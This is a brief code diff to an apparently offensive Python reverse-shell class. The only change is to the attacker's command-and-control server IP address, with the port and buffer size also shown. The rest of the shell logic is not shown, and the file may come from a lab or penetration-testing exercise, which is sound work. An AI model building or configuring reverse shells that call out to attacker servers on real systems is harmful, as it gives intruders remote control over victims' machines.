@@ -3,7 +3,7 @@ import subprocess
 
 class ReverseShell:
   def __init__(self):
-    self.SERVER_HOST = "10.12.143.18" # Change this to attacker's C2 server
+    self.SERVER_HOST = "10.12.129.236" # Change this to attacker's C2 server
     self.SERVER_PORT = 5003
     self.BUFFER_SIZE = 1024 # 1kb
   
